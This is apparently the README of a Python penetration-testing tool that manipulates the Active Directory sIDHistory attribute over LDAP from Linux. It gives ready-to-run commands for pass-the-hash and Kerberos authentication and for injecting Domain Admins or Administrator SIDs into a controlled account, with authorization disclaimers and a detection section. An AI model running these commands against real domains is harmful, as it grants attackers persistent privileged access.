# SID History Attack Tool

A modular Python tool for remotely manipulating SID History attributes in Active Directory environments from Linux hosts.

## Overview

This tool addresses a known limitation in Active Directory penetration testing: the inability to perform SID History attacks from remote UNIX-like systems. Traditional methods require local access to Windows domain controllers and tools like Mimikatz or DSInternals PowerShell module.

The SID History Attack Tool enables security professionals to perform SID History manipulation remotely via LDAP/LDAPS protocols, eliminating the need for local access to domain controllers.

## Architecture

The tool follows a clean, modular architecture for easy debugging and extension:

```
SIDHistoryPython/
├── sidhistory.py              # Main entry point (concise and efficient)
├── core/
│   ├── __init__.py           # Package initialization
│   ├── auth.py               # Authentication manager (NTLM, Kerberos, PTH, PTC)
│   ├── ldap_operations.py    # LDAP queries and modifications
│   ├── sid_utils.py          # SID conversion utilities
│   └── attack.py             # Main attack orchestration
├── requirements.txt          # Dependencies
├── README.md                 # Documentation
├── EXAMPLES.md              # Detailed usage examples
└── LICENSE                  # License
```

## Background

The SID (Security Identifier) History attribute allows objects to retain their SIDs when migrated between domains. This mechanism can be abused for persistence by adding the SID of a privileged account to a controlled user's SID History, effectively granting elevated rights.

## Features

### Core Functionality
- Remote SID History manipulation via LDAP/LDAPS
- Query existing SID History for users
- Lookup SIDs for specific users or groups
- Add specific SIDs to user accounts
- Inject SIDs from one user to another
- Remove SIDs from SID History
- Clear all SID History entries
- Support for SSL/TLS connections

### Authentication Methods
- **NTLM with password**: Standard domain authentication
- **Pass-the-Hash (PTH)**: Authenticate using NT hash instead of password
- **Kerberos**: Use existing Kerberos tickets or ccache files
- **Pass-the-Certificate (PTC)**: Client certificate authentication via LDAPS
- **SIMPLE bind**: Direct bind with DN and password

### Code Quality
- Clean, modular architecture for easy debugging
- Professional codebase following best practices
- Comprehensive error handling and logging
- Type hints for better code clarity

## Requirements

- Python 3.7 or higher
- Network access to the target domain controller
- Valid domain credentials with appropriate permissions

## Installation

```bash
git clone https://github.com/felixbillieres/SIDHistory.git
cd SIDHistory

# Create and activate virtual environment (recommended)
python3 -m venv venv
source venv/bin/activate

# Install dependencies
pip install -r requirements.txt
```

## Usage

### Basic Syntax

```bash
python3 sidhistory.py -d DOMAIN.COM -dc DC_IP [auth-options] [action]
```

### Authentication Examples

#### NTLM with Password (Default)

```bash
python3 sidhistory.py -d DOMAIN.COM -u admin -p Password123 -dc 192.168.1.10 \
                      --target-user attacker --source-user "Domain Admins"
```

#### Pass-the-Hash

```bash
python3 sidhistory.py -d DOMAIN.COM -u admin \
                      --ntlm-hash aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c \
                      -dc 192.168.1.10 --target-user attacker --sid S-1-5-21-xxx-512
```

Or with just NT hash:

```bash
python3 sidhistory.py -d DOMAIN.COM -u admin --ntlm-hash 8846f7eaee8fb117ad06bdd830b7586c \
                      -dc 192.168.1.10 --query-user attacker
```

#### Kerberos Authentication

```bash
# With existing ticket (kinit already done)
python3 sidhistory.py -d DOMAIN.COM -dc 192.168.1.10 --kerberos \
                      --dc-hostname dc01.domain.com \
                      --target-user attacker --source-user Administrator

# With specific ccache file
python3 sidhistory.py -d DOMAIN.COM -dc 192.168.1.10 --kerberos \
                      --ccache /tmp/krb5cc_1000 --dc-hostname dc01.domain.com \
                      --lookup-user Administrator
```

#### Pass-the-Certificate

```bash
python3 sidhistory.py -d DOMAIN.COM -dc 192.168.1.10 --certificate \
                      --cert-file /path/to/cert.pem --key-file /path/to/key.pem \
                      -u username --target-user attacker --source-user Administrator
```

### Action Examples

#### Query SID History

```bash
python3 sidhistory.py -d DOMAIN.COM -u admin -p Password123 -dc 192.168.1.10 \
                      --query-user targetuser
```

#### Lookup User SID

```bash
python3 sidhistory.py -d DOMAIN.COM -u admin -p Password123 -dc 192.168.1.10 \
                      --lookup-user "Domain Admins"
```

#### Inject SID History

```bash
python3 sidhistory.py -d DOMAIN.COM -u admin -p Password123 -dc 192.168.1.10 \
                      --target-user attacker --source-user Administrator
```

#### Add Specific SID

```bash
python3 sidhistory.py -d DOMAIN.COM -u admin -p Password123 -dc 192.168.1.10 \
                      --target-user attacker --sid S-1-5-21-xxx-xxx-xxx-512
```

#### Remove SID from History

```bash
python3 sidhistory.py -d DOMAIN.COM -u admin -p Password123 -dc 192.168.1.10 \
                      --target-user attacker --sid S-1-5-21-xxx-xxx-xxx-512 --remove
```

#### Clear All SID History

```bash
python3 sidhistory.py -d DOMAIN.COM -u admin -p Password123 -dc 192.168.1.10 \
                      --target-user attacker --clear
```

#### Use LDAPS

```bash
python3 sidhistory.py -d DOMAIN.COM -u admin -p Password123 -dc 192.168.1.10 \
                      --use-ssl --dc-hostname dc01.domain.com \
                      --target-user attacker --source-user Administrator
```

## Command-Line Options

### Connection Options
| Option | Description |
|--------|-------------|
| `-d`, `--domain` | Target domain (e.g., DOMAIN.COM) |
| `-dc`, `--dc-ip` | Domain controller IP address |
| `--dc-hostname` | Domain controller hostname (for Kerberos/SSL) |
| `--use-ssl` | Use LDAPS instead of LDAP |

### Authentication Options
| Option | Description |
|--------|-------------|
| `-u`, `--username` | Username for authentication |
| `-p`, `--password` | Password for authentication |
| `--ntlm` | Use NTLM authentication (default) |
| `--ntlm-hash` | Pass-the-Hash with NT hash (format: LM:NT or just NT) |
| `--kerberos` | Use Kerberos authentication |
| `--ccache` | Path to Kerberos credential cache |
| `--certificate` | Use client certificate authentication |
| `--cert-file` | Path to client certificate file (.pem) |
| `--key-file` | Path to client key file (.pem) |
| `--simple` | Use SIMPLE bind |

### Action Options
| Option | Description |
|--------|-------------|
| `--target-user` | Target user to modify |
| `--source-user` | Source user whose SID to inject |
| `--sid` | Specific SID to add/remove |
| `--remove` | Remove SID instead of adding |
| `--clear` | Clear all SID History entries |
| `--query-user` | Query SID History of a user |
| `--lookup-user` | Lookup SID of a specific user |
| `-v`, `--verbose` | Enable verbose output |

## Permissions Required

To successfully modify SID History attributes, the authenticating user must have sufficient privileges in the Active Directory environment. Typically, this requires:

- Domain Administrator privileges
- Or specific delegated permissions on the target user object
- Write access to the `sIDHistory` attribute

## Technical Details

### LDAP Operations

The tool uses the LDAP3 library to perform the following operations:

1. Establish connection to the domain controller via LDAP or LDAPS
2. Search for user objects by sAMAccountName
3. Read the `objectSid` and `sIDHistory` attributes
4. Modify the `sIDHistory` attribute using MODIFY_REPLACE operation

### SID Conversion

The tool includes functions to convert between binary and string representations of SIDs:

- Binary SIDs are stored in Active Directory as raw bytes
- String SIDs follow the format: `S-1-5-21-domain-domain-domain-RID`
- Proper conversion ensures compatibility with AD requirements

## Limitations

- Requires valid domain credentials with appropriate permissions
- Some domain controllers may have additional protections against SID History modification
- Changes may be logged and detected by security monitoring systems
- Does not support the DSInternals method (which requires stopping NTDS service)

## Security Considerations

This tool is intended for authorized security assessments and penetration testing only. Unauthorized access to computer systems is illegal.

- Always obtain proper authorization before use
- Be aware that modifications are logged in AD audit logs
- SID History changes may trigger security alerts
- Use responsibly and ethically

## Detection and Defense

Organizations can detect and prevent SID History attacks by:

- Monitoring changes to the `sIDHistory` attribute
- Restricting permissions to modify security-sensitive attributes
- Implementing administrative tier models
- Using Microsoft Advanced Threat Analytics (ATA) or similar solutions
- Regular auditing of privileged accounts and SID History

## References

- [Microsoft Documentation: sIDHistory Attribute](https://learn.microsoft.com/en-us/windows/win32/adschema/a-sidhistory)
- [MITRE ATT&CK: T1134.005](https://attack.mitre.org/techniques/T1134/005/)
- [The Hacker Recipes: SID History](https://www.thehacker.recipes/ad/persistence/sid-history)
- [ADSecurity: SID History Injection](https://adsecurity.org/?p=1772)

## Author

**Félix Billières (Elliot Belt)**

## Contributing

Contributions are welcome. Please submit pull requests or open issues for bugs and feature requests.

## License

This project is provided for educational and authorized security testing purposes only.

## Disclaimer

This tool is provided as-is without any warranty. The authors are not responsible for any misuse or damage caused by this tool. Use at your own risk and only on systems you have explicit permission to test.

